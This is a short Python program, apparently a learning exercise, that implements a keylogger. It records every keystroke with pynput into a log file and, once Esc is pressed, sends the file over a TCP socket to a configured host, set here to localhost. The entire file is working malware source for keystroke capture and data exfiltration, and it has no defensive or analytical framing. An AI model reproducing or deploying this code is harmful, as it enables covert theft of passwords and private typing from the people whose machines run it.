from pynput import keyboard
import time
import socket


KEEP_CONNECTION = True
HOST = "127.0.0.1"
PORT = 2546



class Keylogger:

    def __init__(self,filename):
        self.filename = filename
        self.listener = keyboard.Listener(on_press=self.write_file)
        self.listener.start()
        self.linebuffer = []
        self.create_file()
    
    def create_file(self):
        with open(self.filename,'w') as f:
            f.write(f"Creation : {time.ctime()} \n")

    def write_file(self, key):
        try:
            print(f"E' stato premuto il tasto: {str(key)}")
            
            if hasattr(key,"char"):
                self.linebuffer.append(key.char)
            
            else:
                if key == keyboard.Key.space:
                    self.linebuffer.append(" ")

                if key == keyboard.Key.enter:
                    self.linebuffer.append("\n")

            with open(self.filename, 'a') as f:
                if len(self.linebuffer) > 0:
                    f.write(''.join(self.linebuffer))
                    self.linebuffer.clear()

                if key == keyboard.Key.esc:
                    self.listener.stop()

        except AttributeError:
            print(f"Tasto speciale premuto: {key}")


    def send_file(self):
        try:
            with open(self.filename,'rb') as f:
                file_data = f.read()
            
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM)  as s:
                s.connect((HOST,PORT))
                s.sendall(file_data)

                print(f"File '{self.filename}' inviato con successo al server.")

        except Exception as e:
            print(f"Errore invio file: {e}")





if __name__ == "__main__":


    keylogger = Keylogger("log.txt")
    keylogger.listener.join()
    keylogger.send_file()
